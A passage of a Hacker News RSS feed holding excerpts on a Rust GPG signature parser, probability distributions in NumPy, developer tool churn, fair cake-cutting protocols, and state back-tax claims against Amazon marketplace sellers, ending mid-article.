</span><code>-</code><span>, then it is prefixed by a dash, followed by a space. We'll know when we're done with parsing the cleartext because the ASCII armor always starts with a line beginning with 5 dashes, which we will recognize as not being dash-escaped.</span></p><p><span>I'll be using </span><a href="https://crates.io/crates/nom"><span>nom</span></a><span> to build all the different parsers we'll need. Nom is a </span><em><span>parser combinator</span></em><span> library. Parser combinators are a technique for writing parsers where simple parsers (say, for recognizing a literal word, or a string of characters which are all </span><code>a</code><span>) are combined to form more complex parsers. All nom parsers have the signature</span></p><pre spellcheck="false" lang="rust"></pre><p><span>where </span><code>T</code><span> is the raw type we're parsing from (usually </span><code>&amp;str</code><span> or </span><code>&amp;[u8]</code><span>) and </span><code>U</code><span> is the type we're parsing. The parser either succeeds or fails, and if it succeeds, it returns a tuple of </span><code>(T, U)</code><span> where the first entry of the tuple is the remaining input, and the second entry of the tuple is what was parsed. For example, a simple parser that parses a </span><code>Color</code><span> enum from a string could look like</span></p><pre spellcheck="false" lang="rust"></pre><p><span>This example defines 3 parsers, </span><code>parse_red</code><span>, </span><code>parse_green</code><span>, and </span><code>parse_blue</code><span>, which look for a literal string, and if it's found, return the associated </span><code>Color</code><span> variant. If the input does not contain the string literal, the parser fails (that's why we can ignore the result of the tag parser, we know what it was, and we can return the built value we wanted). </span><code>parse_color</code><span> is then built from these basic blocks using the </span><code>alt</code><span> combinator, which succeeds if one of the parsers passed to it in a tuple succeeds, and it succeeds with that result. The </span><code>main</code><span> function then parses a single color from the string </span><code>"Green123"</code><span>, leaving the </span><code>123</code><span> string remaining.</span></p><p><span>Now to parse a cleartext signature using nom, we first define a </span><code>struct</code><span> to parse into</span></p><pre spellcheck="false" lang="rust"></pre><p><span>The </span><code>hash</code><span> field will hold the hash variant we're using (could have been an enum if we were being rigorous, or supporting more than just SHA256), the cleartext (after we remove the dash-escaping), and then the signature (which we'll get to later).</span></p><p><span>The parser for our cleartext signature will look like the following</span></p><pre spellcheck="false" lang="rust"></pre><p><span>This parser first recognizes the header, then the hash variant, then the cleartext, then the parts of the ASCII armor. It also enforces that there's no more input to consume using the </span><code>all_consuming</code><span> parser. Assuming all that is successful, we return the pieces we need to assemble the cleartext signature.</span></p><p><span>Drilling down into the methods we decreed must exist</span></p><pre spellcheck="false" lang="rust"></pre><p><code>alphanumeric1</code><span> is a parser included with nom that recognizes at least one alphanumeric character. </span><code>preceded</code><span> is a parser that takes two parsers as argument, it returns as a success the result of the second parser, if both succeed. </span><code>terminated</code><span> is a parser that takes two parsers as argument, and returns as success the result of the first parser, if both are successful. So, the </span><code>parse_hash_armor_header</code><span> function recognizes an </span><code>alphanumeric1</code><span> string preceded by </span><code>Hash:</code><span> and returns it, ignoring any trailing newlines.</span></p><pre spellcheck="false" lang="rust"></pre><p><code>parse_possibly_dash_escaped_chunk</code><span> uses a helper I wrote </span><code>fold_into_string</code><span> which takes a parser that parses a single line of text and runs it repeatedly (until it fails), collecting the results into a </span><code>String</code><span>. We then </span><code>pop()</code><span> the last character off the string, because we don't need the last newline.</span></p><pre spellcheck="false" lang="rust"></pre><p><code>parse_possibly_dash_escaped_line</code><span> uses the </span><code>alt</code><span> combinator we've already seen to either parse a line beginning with no dash, or a line beginning with a dash-space. </span><code>parse_line_newline_inclusive</code><span> is a helper to grab a string slice including the last newline. Because nom parsers can recognize up to the newline, but not go past it in the same breath, I needed an unsafe function to consume the newline, and then modify the resulting string slice to be 1 byte longer, which is safe because I know the next byte was a newline (or the parser would have failed).</span></p><pre spellcheck="false" lang="rust"></pre><p><span>Now, we can go back up and see the </span><code>Cleartext::parse</code><span> function</span></p><pre spellcheck="false" lang="rust"></pre><p><span>Not every line of this is clear yet. We haven't talked about ASCII armor or PGP packets at all yet. Nonetheless, …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://andrewhalle.github.io/build-your-own/gpg">https://andrewhalle.github.io/build-your-own/gpg</a></em></p>]]>
            </description>
            <link>https://andrewhalle.github.io/build-your-own/gpg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073982</guid>
            <pubDate>Thu, 12 Nov 2020 19:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Essential Math for Data Science: Probability mass and density functions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073949">thread link</a>) | @magicbean
<br/>
November 12, 2020 | https://hadrienj.github.io/posts/Essential-Math-probability-distributions/ | <a href="https://web.archive.org/web/*/https://hadrienj.github.io/posts/Essential-Math-probability-distributions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p> This post is a sample of my book <b>Essential Math for Data Science</b>!</p><p>Learn the math needed for data science and machine learning using a <span>practical approach with Python</span>.</p><div><p>Get it before the 30th of November 2020 and benefit from a <b>HUGE DISCOUNT</b>!</p><p><a href="https://www.essentialmathfordatascience.com/"> <b>GET THE BOOK</b> </a></p></div></div><p><img src="https://hadrienj.github.io/assets/images/cover_free_sample.jpg" width="200px"></p></div><p>In the chapter 02 of <a href="https://www.essentialmathfordatascience.com/">Essential Math for Data Science</a>, you can learn about basic descriptive statistics and probability theory. We’ll cover probability mass and probability density function in this sample. You’ll see how to understand and represent these distribution functions and their link with histograms.</p><p><em>Deterministic</em> processes give the same results when they are repeated multiple times. This is not the case for random variables, which describe <em>stochastic</em> events, in which randomness characterizes the process.</p><p>This means that random variables can take various values. How can you describe and compare these values? One good way is to use the probability that each outcome will occur. The probability distribution of a random variable is a function that takes the sample space as input and returns probabilities: in other words, it maps possible outcomes to their probabilities.</p><p>In this section, you’ll learn about probability distributions for discrete and continuous variables.</p><h3 id="sec:ch11_probability_mass_functions">Probability Mass Functions</h3><p>Probability functions of discrete random variables are called <em>probability mass functions</em> (or PMF). For instance, let’s say that you’re running a dice-rolling experiment. You call $\rx$ the random variable corresponding to this experiment. Assuming that the die is fair, each outcome is <em>equiprobable</em>: if you run the experiment a large number of times, you will get each outcome approximately the same number of times. Here, there are six possible outcomes, so you have one chance over six to draw each number.</p><p>Thus, the probability mass function describing $\rx$ returns $\frac{1}{6}$ for each possible outcome and 0 otherwise (because you can’t get something different than 1, 2, 3, 4, 5 or 6).</p><p>You can write $P(\rx = 1) = \frac{1}{6}$, $P(\rx = 2) = \frac{1}{6}$, and so on.</p><h4 id="properties-of-probability-mass-functions">Properties of Probability Mass Functions</h4><p>Not every function can be considered as a probability mass function. A probability mass function must satisfy the following two conditions:</p><ul><li>The function must return values between 0 and 1 for each possible outcome:</li></ul><p>\[0 \leq P(x) \leq 1\]</p><ul><li>The sum of probabilities corresponding to all the possible outcomes must be equal to 1:</li></ul><p>\[\sum\limits_{x \in S} P(x) = 1\]</p><p>The value of $x$ can be any real number because values outside of the sample space are associated with a probability of 0. Mathematically, for any value $x$ not in the sample space $S$, $P(x)=0$.</p><h4 id="simulation-of-the-dice-experiment">Simulation of the Dice Experiment</h4><p>Let’s simulate a die experiment using the function <code>np.random.randint(low, high, size)</code> from Numpy which draw $n$ (<code>size</code>) random integers between <code>low</code> and <code>high</code> (excluded). Let’s simulate 20 die rolls:</p><div><div><pre><code>
<span>rolls</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>randint</span><span>(</span><span>1</span><span>,</span> <span>7</span><span>,</span> <span>20</span><span>)</span>
<span>rolls</span>
</code></pre></div></div><div><div><pre><code>array([6, 3, 5, ..., 6, 5, 1])
</code></pre></div></div><p>This array contains the 20 outcomes of the experiment. Let’s call $\rx$ the discrete random variable corresponding to the die rolling experiment. The probability mass function of $\rx$ is defined only for the possible outcomes and gives you the probability for each of them.</p><p>Assuming the die is fair, you should have an <em>uniform distribution</em>, that is, equiprobable outcomes..</p><p>Let’s visualize the quantity of each outcome you got in the random experiment. You can divide by the number of trials to get the probability. Let’s use <code>plt.stem()</code> from Matplotlib to visualize these probabilities:</p><div><div><pre><code><span>val</span><span>,</span> <span>counts</span> <span>=</span> <span>np</span><span>.</span><span>unique</span><span>(</span><span>rolls</span><span>,</span> <span>return_counts</span><span>=</span><span>True</span><span>)</span>
<span>plt</span><span>.</span><span>stem</span><span>(</span><span>val</span><span>,</span> <span>counts</span><span>/</span><span>len</span><span>(</span><span>rolls</span><span>),</span> <span>basefmt</span><span>=</span><span>"C2-"</span><span>,</span> <span>use_line_collection</span><span>=</span><span>True</span><span>)</span>

</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_9_0.png" alt="Figure 1: Probability mass function of the random variable $\rx$ corresponding to a die rolling a six-sided die estimated from 20 rolls." width="250px"> <em>Figure 1: Probability mass function of the random variable $\rx$ corresponding to a die rolling a six-sided die estimated from 20 rolls.</em></p><p>With a uniform distribution, the plot would have the same height for each outcome (since the height corresponds to the probability, which is the same for each outcome of a die throw). However, the distribution shown in Figure 1 doesn’t look uniform. That’s because you didn’t repeat the experiment enough: the probabilities will stand when you repeat the experiment a large number of times (in theory, an infinite number of times).</p><p>Let’s increase the number of trials:</p><div><div><pre><code>
<span>throws</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>randint</span><span>(</span><span>1</span><span>,</span> <span>7</span><span>,</span> <span>100000</span><span>)</span>
<span>val</span><span>,</span> <span>counts</span> <span>=</span> <span>np</span><span>.</span><span>unique</span><span>(</span><span>throws</span><span>,</span> <span>return_counts</span><span>=</span><span>True</span><span>)</span>
<span>plt</span><span>.</span><span>stem</span><span>(</span><span>val</span><span>,</span> <span>counts</span><span>/</span><span>len</span><span>(</span><span>throws</span><span>),</span> <span>basefmt</span><span>=</span><span>"C2-"</span><span>,</span> <span>use_line_collection</span><span>=</span><span>True</span><span>)</span>

</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_11_0.png" alt="Figure 2: Probability mass function of the random variable $\rx$ corresponding to a die rolling experiment estimated from 100,000 rolls." width="250px"> <em>Figure 2: Probability mass function of the random variable $\rx$ corresponding to a die rolling experiment estimated from 100,000 rolls.</em></p><p>With enough trials, the probability mass function showed in Figure 2 looks uniform. This underline the importance of the number of trials from a frequentist probability point of view.</p><h3 id="sec:ch11_section_probability_density_functions">Probability Density Functions</h3><p>With continuous variables, there is an infinite number of possible outcomes (limited by the number of decimals you use). For instance, if you were drawing a number between 0 and 1 you might get an outcome of, for example, 0.413949834. The probability of drawing each number tends towards zero: if you divide something by a very large number (the number of possible outcomes), the result will be very small, close to zero. This is not very helpful in describing random variables.</p><p>It is better to consider the probability of getting a specific number within a range of values. The $y$-axis of probability density functions is not a probability. It is called a <em>probability density</em> or just <em>density</em>. Thus, probability distributions for continuous variables are called <em>probability density functions</em> (or PDF).</p><p>The integral of the probability density function over a particular interval gives you the probability that a random variable takes a value in this interval. This probability is thus given by the area under the curve in this interval (as you can see in <a href="https://www.essentialmathfordatascience.com/">Essential Math for Data Science</a>).</p><h4 id="notation">Notation</h4><p>Here, I’ll denote probability density functions using a lowercase $p$. For instance, the function $p(x)$ gives you the density corresponding to the value $x$.</p><h4 id="example">Example</h4><p>Let’s inspect an example of probability density function. You can randomly draw data from a normal distribution using the Numpy function <code>np.random.normal</code> (you’ll find more details about the normal distribution in <a href="https://www.essentialmathfordatascience.com/">Essential Math for Data Science</a>).</p><p>You can choose the parameters of the normal distribution (the mean and the standard deviation) and the number of samples. Let’s create a variable <code>data</code> with 1,000 values drawn randomly from a normal distribution with a mean of 0.3 and a standard deviation of 0.1.</p><div><div><pre><code><span>np</span><span>.</span><span>random</span><span>.</span><span>seed</span><span>(</span><span>123</span><span>)</span>
<span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>normal</span><span>(</span><span>0.3</span><span>,</span> <span>0.1</span><span>,</span> <span>1000</span><span>)</span>
</code></pre></div></div><p>Let’s look at the shape of the distribution using an histogram. The function <code>plt.hist()</code> returns the exact values for the $x$- and $y$-coordinates of the histogram. Let’s store this in a variable called <code>hist</code> for latter use:</p><div><div><pre><code><span>hist</span> <span>=</span> <span>plt</span><span>.</span><span>hist</span><span>(</span><span>data</span><span>,</span> <span>bins</span><span>=</span><span>13</span><span>,</span> <span>range</span><span>=</span><span>(</span><span>-</span><span>0.3</span><span>,</span> <span>1</span><span>))</span>
</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_19_0.png" alt="Figure 3: Histogram of the data generated from a normal distribution. The $x$-axis is the value of the element in the vector and the $y$-axis the number of elements (count) that are in the corresponding range." width="250px"> <em>Figure 3: Histogram of the data generated from a normal distribution. The $x$-axis is the value of the element in the vector and the $y$-axis the number of elements (count) that are in the corresponding range.</em></p><div><p><b>Histograms</b></p><p><it>Histograms</it> show how values are distributed. It is a way to model a probability distribution using a finite number of values from the distribution. Since we're dealing with continuous distributions, this histogram corresponds to the number of values for specific intervals (the intervals depends on the parameter <code>bins</code> in the function <code>hist()</code>).</p><p>For instance, Figure 3 shows that there are around 347 elements in the interval (0.2, 0.3). Each bin corresponds to a width of 0.1, since we used 13 bins to represent data in the range -0.3 to 1.</p></div><p>Let’s have a closer look at the distribution with more bins. You can use the parameter <code>density</code> to make the $y$-axis correspond to the probability density instead of the count of values in each bin:</p><div><div><pre><code><span>hist</span> <span>=</span> <span>plt</span><span>.</span><span>hist</span><span>(</span><span>data</span><span>,</span> <span>bins</span><span>=</span><span>24</span><span>,</span> <span>range</span><span>=</span><span>(</span><span>-</span><span>0.2</span><span>,</span> <span>1</span><span>),</span> <span>density</span><span>=</span><span>True</span><span>)</span>

</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_22_0.png" alt="Figure 4: Histogram using 30 bins and density instead of counts." width="250px"> <em>Figure 4: Histogram using 30 bins and density instead of counts.</em></p><p>You can see in Figure 4 that there are more bins in this histogram (24 instead of 13). This means that each bin has now a smaller width. The $y$-axis is also on a different scale: it corresponds to the density, not the counter of values as before.</p><p>To calculate the probability to draw a value in a certain range from the density, you need to use the area under the curve. In the case of histograms, this is the area of the bars.</p><p>Let’s take an example with the bar ranging from 0.2 to 0.25, associated with the following density:</p><div><div><pre><code><span>print</span><span>(</span><span>f"Density: </span><span>{</span><span>hist</span><span>[</span><span>0</span><span>][</span><span>8</span><span>].</span><span>round</span><span>(</span><span>4</span><span>)</span><span>}</span><span>"</span><span>)</span>
<span>print</span><span>(</span><span>f"Range x: from </span><span>{</span><span>hist</span><span>[</span><span>1</span><span>][</span><span>8</span><span>].</span><span>round</span><span>(</span><span>4</span><span>)</span><span>}</span><span> to </span><span>{</span><span>hist</span><span>[</span><span>1</span><span>][</span><span>9</span><span>].</span><span>round</span><span>(</span><span>4</span><span>)</span><span>}</span><span>"</span><span>)</span>
</code></pre></div></div><div><div><pre><code>Density: 2.8
Range x: from 0.2 to 0.25
</code></pre></div></div><p>Since there are 24 bins and the range of possible outcomes is from -0.2 to 1, each bar corresponds to a range of $\frac{1-(-0.2)}{24}=\frac{1.2}{24}=0.05$. In our example, the height of the bar (the one from 0.2 to 0.25) is around 2.8, so the area of this bar is $2.8 \cdot 0.05 = 0.14$. This means that the probability of getting a value between 0.2 and 0.25 is around 0.14, or 14%.</p><p>You saw that the sum of the probabilities must be equal to one, so the sum of the bar’s areas should be equal to one. Let’s check that: you can take the vector containing the densities (<code>hist[0]</code>) and multiply it by the bar width (0.05):</p><div><div><pre><code><span>(</span><span>hist</span><span>[</span><span>0</span><span>]</span> <span>*</span> <span>0.05</span><span>).</span><span>sum</span><span>().</span><span>round</span><span>(</span><span>4</span><span>)</span>
</code></pre></div></div><p>All good: the sum of the probabilities is equal to one.</p><h4 id="from-histograms-to-continuous-probability-density-functions">From Histograms to Continuous Probability Density Functions</h4><p>Histograms represent a binned version of the probability density function. Figure 5 shows a representation of the true probability density function. The blue shaded area in the figure corresponds to the probability of getting a number between 0 and 0.2 (the area under the curve between 0 and 0.2).</p><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_density_function_area.png" alt="Figure 5: The probability to draw a number between 0 and 0.2 is the highlighted area under the curve." width="300px"> <em>Figure 5: The probability to draw a number between 0 and 0.2 is the highlighted area under the curve.</em></p><h4 id="properties-of-probability-density-functions">Properties of Probability Density Functions</h4><p>Like probability mass functions, probability density functions must satisfy some requirements. The first is that it must return only non negative values. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hadrienj.github.io/posts/Essential-Math-probability-distributions/">https://hadrienj.github.io/posts/Essential-Math-probability-distributions/</a></em></p>]]>
            </description>
            <link>https://hadrienj.github.io/posts/Essential-Math-probability-distributions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073949</guid>
            <pubDate>Thu, 12 Nov 2020 19:39:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One untold truth about the geniuses in Silicon Valley]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073827">thread link</a>) | @kirillzubovsky
<br/>
November 12, 2020 | https://smashnotes.com/p/below-the-line-with-james-beshara/e/3-eric-ries-psychological-journey/s/what-is-one-untold-truth-about-genius-in-silicon-valley | <a href="https://web.archive.org/web/*/https://smashnotes.com/p/below-the-line-with-james-beshara/e/3-eric-ries-psychological-journey/s/what-is-one-untold-truth-about-genius-in-silicon-valley">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>
        What is the untold truth about the geniuses in Silicon Valley?
    </p>
    
    <div>
      <p>Often times even the geniuses in Silicon Valley don't know how great of a product they have until it is beyond popular. </p>

<p>During the early days of Facebook, for example, the founders were busy working on side projects, even as users were breaking down the front door asking to be let onto the platform. The first version of Instagram was a massive failure. The list is long.</p>

<p>Once the product is popular though, the geniuses can do a lot of things wrong and still succeed because the core of their success is so strong, it cannot fail.</p>
    </div>
      <h5>You might also like</h5>
        <a title="How did Sahil Lavingia start Gumroad?" href="https://smashnotes.com/p/below-the-line-with-james-beshara/e/11-sahil-lavingia-solo-journey/s/how-did-sahil-lavingia-start-gumroad">
          <div>
            <div>
            
            <div>
            <p>How did Sahil Lavingia start Gumroad</p>
            <p>Sahil started with the idea for Gumroad while still working at Pinterest ba ...</p>
            </div>
            </div>
          </div>
        </a>        <a title="How successful was Y Combinator aiming to become?" href="https://smashnotes.com/p/econtalk-archives-2009/e/graham-on-start-ups-innovation-and-creativity/s/how-successful-was-y-combinator-aiming-to-become">
          <div>
            <div>
            
            <div>
            <p>How successful was Y Combinator aiming to become</p>
            <p>While investing 7 times the volume, and 1/100s the amount in comparison to  ...</p>
            </div>
            </div>
          </div>
        </a>        <a title="What makes for a great hacker?" href="https://smashnotes.com/p/econtalk-archives-2009/e/graham-on-start-ups-innovation-and-creativity/s/what-makes-for-a-great-hacker">
          <div>
            <div>
            
            <div>
            <p>What makes for a great hacker</p>
            <p>In both programming and paining, there are people who are amazingly talente ...</p>
            </div>
            </div>
          </div>
        </a>        <a title="How can you avoid feeling that your work is insignificant?" href="https://smashnotes.com/p/the-startup-chat-with-steli-and-hiten/e/456-the-fear-of-doing-something-insignificant/s/how-can-you-avoid-feeling-that-your-work-is-insignificant">
          <div>
            <div>
            
            <div>
            <p>How can you avoid feeling that your work is insignificant</p>
            <p>To avoid feeling like you are not doing enough you have to first define wha ...</p>
            </div>
            </div>
          </div>
        </a>
  </div></div>]]>
            </description>
            <link>https://smashnotes.com/p/below-the-line-with-james-beshara/e/3-eric-ries-psychological-journey/s/what-is-one-untold-truth-about-genius-in-silicon-valley</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073827</guid>
            <pubDate>Thu, 12 Nov 2020 19:28:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Magpie Developers and Their Opposites]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073821">thread link</a>) | @deltamidway
<br/>
November 12, 2020 | https://www.neomindlabs.com/post/magpie-developers-their-opposites | <a href="https://web.archive.org/web/*/https://www.neomindlabs.com/post/magpie-developers-their-opposites">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><blockquote>“I’ve often thought that software developers were akin to Magpies, birds notorious for stealing shiny items to decorate their complex nests. Like Magpies, software developers are unusually smart and curious creatures, almost by definition. But we are too easily distracted by shiny new toys and playthings.”</blockquote><p>—<a href="https://blog.codinghorror.com/the-magpie-developer/" target="_blank">Jeff Atwood</a>, co-founder of Stack Overflow</p><p>I think many developers ignore this observation because “Taking this reasoning to its reduction ad absurdum would mean picking Java and then trying to implement a website without using anything else at all. That would be crazy. You need some means to add things to your toolbox.” </p><p>”It is basically always the case that the long-term costs of keeping a system working reliably vastly exceed any inconveniences you encounter while building it.” —<a href="https://mcfunley.com/" target="_blank">Dan McKinley</a></p><p>We all know someone who jumped from tool to tool and eventually settled somewhere. Whether it’s Java, PHP, Cobol, or (in the case of Neomind) Ruby, finding tools you love to solve a particular problem and sticking with them can lead to a depth of understanding familiarity that completely changes the game. I believe this happens to developers when they get tired of the endless churn of new technologies, and as they start to care more about maintainability.</p><p>I’m not arguing that Ruby on Rails is the best tool for every job or that it’s so good everyone should stop inventing new things. On the contrary, I love that people are always experimenting, and I love playing with their experiments. <strong>But it would be unprofessional and irresponsible to use every shiny new thing on the types of long-lived assets most people are building.</strong></p><p>Why is it unprofessional and irresponsible to use shiny new technology?</p><p>Many new tools and frameworks implement sweeping changes after their initial versions, making the upgrade path virtually a rewrite from scratch. A new fad replaces others and fizzles out. Marketing sites, special seasonal initiatives, or one-off applications that serve a limited need have lifespans measured in months. On projects like these, longevity and maintainability don’t play a role in the decision-making process, and developers are free to experiment with whatever new tech they choose.</p><p>Most of the projects we see have lifespans measured in years, and yet what is the decision-making process for choosing the platform? Projects governed by the tech-fashion-trend of the day.</p><figure><p><img src="https://assets.website-files.com/5e5ae68f66194f4c868f9602/5f9b5d76c4bf1ca576e16a61_lolz-meme.jpg" loading="lazy" alt="unlambda meme"></p></figure><p>Using new/unproven technologies on projects like these would be an irresponsible waste of other people’s money. Failing to consider the lifespan and maintenance needs of the project when choosing a framework would be nothing short of unprofessional (and as someone who uses Zoolander memes in his blogposts, I know a thing or two about professionalism). Yet, many developers make their technology choices purely from what will be the most fun for them. Bored developers find a little “Resume Driven Development” hard to resist.</p><p>Even worse, many managers <em>allow</em> this kind of decision-making to “keep the developers happy” and hopefully reduce turnover costs. Many times, the developers only stay a little longer, and there’s a trail of disjointed, unrelated, hard-to-maintain experiments left in their wake.</p><p>Choosing a framework whose longevity and maturity reflect your application’s likely lifespan and needs is an important consideration. There are no guarantees, but choosing an immature platform with a small or disengaged community can be a costly, unprofessional mistake.</p><p>“Mindful choice of technology gives engineering minds real freedom: the freedom to contemplate bigger questions. Technology for its own sake is snake oil.” Also<a href="https://mcfunley.com/" target="_blank"> Dan McKinley</a>.</p><p>‍</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.neomindlabs.com/post/magpie-developers-their-opposites</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073821</guid>
            <pubDate>Thu, 12 Nov 2020 19:27:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FairDivision]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073516">thread link</a>) | @wooby
<br/>
November 12, 2020 | https://tailrecursion.com/~alan/FairDivision.html | <a href="https://web.archive.org/web/*/https://tailrecursion.com/~alan/FairDivision.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>
Created Monday 09 November 2020
</p>

<h2>I cut, you choose</h2>



<p>
The "<a href="https://en.wikipedia.org/wiki/Divide_and_choose" title="I cut, you choose">I cut, you choose</a>" method of dividing something fairly between two people is well known. Given some divisible resource, like a pizza, two people may divide the resource using the following protocol:
</p>

<ol type="1" start="1">
<li>One person is chosen at random to cut the pizza in two pieces.</li>
<li>The person who did not cut takes a piece.</li>
<li>The person who cut takes the remaining piece.</li>
</ol>


<p>
This protocol is easy to remember and to explain. It is also efficient in the sense that the minimal number of pieces — two — are created.
</p>

<p>
If you haven't before, I encourage you to now take a moment to consider how a resource could be divided fairly between any number people, not just two.
</p>

<p>
I thought about this recently myself when I needed to divide a large cookie between myself, my wife, and our 4-year-old daughter. I excused myself to think about how to proceed. When I returned, the cookie had been eaten! That's one protocol I <i>don't</i> recommend.
</p>

<h2>The Fink protocol</h2>



<p>
Later (and after eating an entire large cookie without even telling my family about it) I sat down to research the problem. I consulted with my friend Micha Niskin and he suggested the following technique he had devised, which I discovered later is known as the <a href="https://en.wikipedia.org/wiki/Fink_protocol" title="Fink protocol:">Fink protocol:</a>
</p>

<ol type="1" start="1">
<li>If there are two people, perform "I cut, you choose".</li>
<li>If there are three people, two are chosen randomly. The two randomly chosen people perform "I cut, you choose".</li>
<li>The two people with a piece each cut their piece into thirds.</li>
<li>The third person without any pieces yet chooses one piece from each of the two with pieces.</li>
<li>All people now have two pieces each.</li>
<li>If a fourth person joins, each of the three with pieces cut each of their pieces in two.</li>
<li>The fourth person without any pieces yet chooses one piece from each of the three with pieces.</li>
<li>All people now have three pieces each.</li>
<li>...and so on.</li>
</ol>


<p>
The biggest drawback of the Fink protocol is that each person ends up with n-1 pieces, where n is the number of people, instead of a single piece of size 1/n. On the other hand, like "I cut, you choose", this protocol is easy to remember, and is almost as easy to explain, even to children.
</p>

<p>
There are actually many approaches to problem, all with various tradeoffs. I didn't find any of them nearly as easy to remember or explain (especially to <i>hungry</i> children!) as Fink, but if you want to do your own research, <a href="https://en.wikipedia.org/wiki/Fair_cake-cutting" title="Fair cake-cutting on Wikipedia">Fair cake-cutting on Wikipedia</a> is where I started.
</p>

	</div></div>]]>
            </description>
            <link>https://tailrecursion.com/~alan/FairDivision.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073516</guid>
            <pubDate>Thu, 12 Nov 2020 19:04:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[States go after Amazon merchants-and sometimes Amazon-for millions in back taxes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073467">thread link</a>) | @rhinoh
<br/>
November 12, 2020 | https://www.route-fifty.com/finance/2020/11/states-small-businesses-amazon-millions-back-sales-taxes/169999/ | <a href="https://web.archive.org/web/*/https://www.route-fifty.com/finance/2020/11/states-small-businesses-amazon-millions-back-sales-taxes/169999/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

    <div>

      <div>
        

        
          
        

        
  
    <div>
      


<div>
  
  <p>Connecting state and local government leaders</p>
</div>

    </div>
  


        
          

          
        

      </div>

      
      <div>

        <div>
          
          <p>
            
              
                
                  



  By


<span><span>
        Liz Farmer
      </span></span>

                
              
            
          </p>

          
            <p><span>|</span>
          

          
            <time datetime="2020-11-12T17:57:00+00:00">
             November 12, 2020
            </time>
          
        </p></div>

        
          <h2>The Supreme Court in 2018 gave states the power to make new rules for collecting sales taxes online. But back taxes on products sold by small businesses on Amazon’s marketplace are still a major point of dispute.  </h2>
        

        
  <ul>
    
      <li>
        <a href="https://www.route-fifty.com/topic/taxes/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                Taxes
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/state-government/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                State Government
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/small-businesses/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                Small Businesses
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/california/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                California
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/south-carolina/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                South Carolina
              </span>
            </span>
          </span>
        </a>
      </li>
    
  </ul>


        





        

      </div>
      

    </div>
  </div><div>
<div>

<div>
<p>Amazon is one of the nation’s largest retailers in part because of its rapidly growing online marketplace, which allows small business owners to sell their products to a vastly larger group of consumers. In fact, Amazon’s marketplace sales more than doubled in just three years, climbing to <a href="https://www.statista.com/statistics/882919/amazon-marketplace-sales-usa/" target="_blank">about $230 billion in 2019</a><u>, </u>accounting for more than half of the online giant’s business.</p><p>But up until last year, many of those sales weren’t taxed because the legal requirement to do so was murky. Now, some state governments are trying to recoup those taxes. But whether they’re going after Amazon or small business owners themselves for that money depends upon the state.</p><p>In California, a state agency is trying to collect back taxes from Fulfilled-By-Amazon (FBA) sellers from as far back as 2012, when Amazon first opened warehouses and fulfillment centers there.</p><p>Earlier this year, Philadelphia-based FBA seller Brian Freifelder received a notice from the California Department of Tax &amp; Fee Administration (CDTFA) warning that he could owe California up to $1.6 million in back sales tax, plus penalties and interest. (After the story made national news, the CDTFA admitted the $1.6 million estimate was “<a href="https://www.sacbee.com/news/politics-government/capitol-alert/article237036689.html" target="_blank">higher than it should have been</a><u>,</u>” but did not let Freifelder off the hook.)</p><p>The CDTFA argues that a business owner’s inventory stored for sale in California amounts to having a physical presence there, and therefore triggered the eligibility for those sales to be taxed. The action by the agency has sparked at least two lawsuits, the <a href="https://aboutblaw.com/Paf" target="_blank">most recent one</a> filed in September by the trade organization Online Merchants Guild. The guild, which represents FBA sellers, says those sales taxes should have been collected by Amazon in the first place because Amazon was the retailer. In the marketplace format, it argues, merchants are the equivalent of suppliers because they don’t have control over where their products are shipped or sold.</p><p>“They [the CDTFA] have no more discretion to go after 